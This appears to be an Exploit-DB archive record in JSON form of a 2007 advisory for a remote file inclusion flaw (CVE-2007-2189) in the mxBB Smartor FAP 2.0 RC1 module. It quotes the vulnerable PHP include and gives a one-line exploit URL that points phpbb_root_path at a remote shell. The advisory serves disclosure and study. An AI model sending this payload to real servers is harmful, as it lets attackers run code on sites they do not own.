{
  "id": "3766",
  "title": "Mx Module Smartor Album FAP 2.0 RC 1 - Remote File Inclusion",
  "cve": "CVE-2007-2189",
  "vuln_type": "unknown",
  "code": "               ########################################################################\r\n\r\n                mxBB Module MX Smartor FAP 2.0 RC1 Remote File Inclusion Vulnerability\r\n\r\n               ########################################################################\r\n\r\n\r\nClass: Remote\r\n\r\nVendor: http://www.mx-system.com/modules/mx_pafiledb/dload.php?action=download&file_id=364\r\n\r\nFounder: bd0rk\r\n\r\nContact: bd0rk[at]hackermail.com\r\n\r\nVulnerable Code in /admin/admin_album_otf.php\r\n\r\n---------------------------------------------------------------------------------------------\r\ndefine( 'IN_PORTAL', 1 );\r\n\r\nif ( !empty( $setmodules ) )\r\n{\r\n\t$file = basename( __FILE__ );\r\n\t$module['Smartor_Album']['Configuration otf'] = 'modules/mx_smartor/admin/' . $file;\r\n\treturn;\r\n}\r\n\r\n$mx_root_path = './../../../';\r\n$module_root_path = \"./../\";\r\n$phpEx = substr(strrchr(__FILE__, '.'), 1);\r\nrequire( $mx_root_path . '/admin/pagestart.' . $phpEx );\r\n\r\ninclude_once($phpbb_root_path . 'includes/functions_validate.'.$phpEx);\r\n---------------------------------------------------------------------------------------------\r\n\r\n$phpbb_root_path is not declared before include_once\r\n\r\n[+]Exploit: http://[target]/modules/mx_smartor/admin/admin_album_otf.php?phpbb_root_path=Shell?\r\n\r\nShouts: str0ke, TheJT, Lu7k, GolD_M ;-)\r\n\r\n# milw0rm.com [2007-04-19]",
  "url": "https://www.exploit-db.com/exploits/3766"
}